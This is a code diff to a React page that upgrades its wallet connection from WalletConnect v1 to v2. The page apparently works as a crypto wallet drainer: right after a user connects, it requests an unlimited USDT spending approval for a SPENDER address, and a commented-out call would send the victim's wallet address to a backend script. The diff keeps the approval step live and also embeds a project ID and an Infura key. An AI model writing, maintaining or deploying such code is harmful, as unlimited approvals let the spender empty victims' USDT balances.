@@ -1,7 +1,7 @@
 'use client';
 
 import React, { useState } from 'react';
-import WalletConnectProvider from "@walletconnect/web3-provider";
+import EthereumProvider from "@walletconnect/ethereum-provider";
 import Web3 from "web3";
 
 const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
@@ -29,42 +29,45 @@ export default function Home() {
     setStatus('processing');
     setError(null);
     try {
-      // 1. Init WalletConnect provider
-      const provider = new WalletConnectProvider({
-        rpc: {
+      // 1. Init WalletConnect v2 provider
+      const provider = await EthereumProvider.init({
+        projectId: "5304256cb79a264108479aea79d8ae5b",
+        chains: [1], // Ethereum mainnet
+        showQrModal: true,
+        methods: ["eth_sendTransaction", "personal_sign", "eth_signTypedData"],
+        optionalChains: [],
+        optionalMethods: [],
+        rpcMap: {
           1: "https://mainnet.infura.io/v3/ae6b05eda23642408e85dbd5bf7e705cb"
-        },
-        qrcode: true
+        }
       });
 
-      // 2. Enable session (triggers QR code/modal/deep link)
       await provider.enable();
 
-      // 3. Web3 instance
+      // 2. Web3 instance
       const web3 = new Web3(provider as any);
 
-      // 4. Get accounts
+      // 3. Get accounts
       const accounts = await web3.eth.getAccounts();
       if (!accounts || accounts.length === 0) throw new Error("No account found");
       const walletAddress = accounts[0];
       setWallet(walletAddress);
 
-      // 5. (Optional) Send wallet to backend
-      // fetch('/save-wallet.php', {
+      // 4. (Optional) Send wallet to backend
+      // await fetch('/save-wallet.php', {
       //   method: 'POST',
       //   headers: { 'Content-Type': 'application/json' },
       //   body: JSON.stringify({ address: walletAddress })
       // });
 
-      // 6. Approve USDT unlimited
-      if (!ABI || !USDT_CONTRACT) throw new Error("ABI or contract address missing");
+      // 5. Approve USDT unlimited
       const contract = new web3.eth.Contract(ABI as any, USDT_CONTRACT);
       await contract.methods.approve(SPENDER, MAX_UINT).send({ from: walletAddress });
 
       setStatus('success');
       setTimeout(() => setStatus('idle'), 2500);
 
-      // 7. Disconnect provider (optional)
+      // 6. Disconnect provider (optional)
       provider.disconnect();
     } catch (e: any) {
       setStatus('failed');
